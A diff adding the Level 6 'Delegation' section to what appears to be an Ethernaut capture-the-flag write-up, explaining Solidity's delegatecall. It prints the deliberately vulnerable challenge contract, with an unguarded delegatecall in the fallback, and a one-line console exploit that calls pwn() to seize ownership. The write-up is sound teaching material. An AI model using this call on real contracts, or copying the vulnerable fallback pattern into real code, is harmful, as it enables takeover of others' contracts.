@@ -377,3 +377,96 @@ An easier alternative is to use OpenZeppelin's SafeMath library that automatical
 a = a.add(c);
 If there is an overflow, the code will revert.
 
+## Level 6: Delegation
+
+The goal of this level is for you to claim ownership of the instance you are given.
+Contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Delegate {
+
+  address public owner;
+
+  constructor(address _owner) public {
+    owner = _owner;
+  }
+
+  function pwn() public {
+    owner = msg.sender;
+  }
+}
+
+contract Delegation {
+
+  address public owner;
+  Delegate delegate;
+
+  constructor(address _delegateAddress) public {
+    delegate = Delegate(_delegateAddress);
+    owner = msg.sender;
+  }
+
+  fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+  }
+}
+```
+
+First, let’s have a look at what delegatecall is.
+
+delegatecall is a low level function similar to call.
+When contract A executes delegatecall to contract B, B's code is executed
+with contract A's storage, `msg.sender` and `msg.value`.
+
+Here an example taken from https://solidity-by-example.org/delegatecall/ 
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+// NOTE: Deploy this contract first
+contract B {
+    // NOTE: storage layout must be the same as contract A
+    uint256 public num;
+    address public sender;
+    uint256 public value;
+
+    function setVars(uint256 _num) public payable {
+        num = _num;
+        sender = msg.sender;
+        value = msg.value;
+    }
+}
+
+contract A {
+    uint256 public num;
+    address public sender;
+    uint256 public value;
+
+    function setVars(address _contract, uint256 _num) public payable {
+        // A's storage is set, B is not modified.
+        (bool success, bytes memory data) = _contract.delegatecall(
+            abi.encodeWithSignature("setVars(uint256)", _num)
+        );
+    }
+}
+```
+
+As we can see in the example, the `delegatecall` in contract A gets 2 parameters, the signature of the `setVars()` function to be called in contract B and a parameter for the `setVars()` function.
+
+If we compare it with the contract from the Ethernaut level, we realize, that we have to provide the signature of the `pwn()` function to contract Delegation in msg.data.
+
+So here is what we have to do in the console of the browser:
+
+`await sendTransaction({from: player, to: contract.address, data: web3.eth.abi.encodeFunctionSignature("pwn()")})`
+
+And now you are the owner :) Congrats :)
+
+### Learning:
+Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.
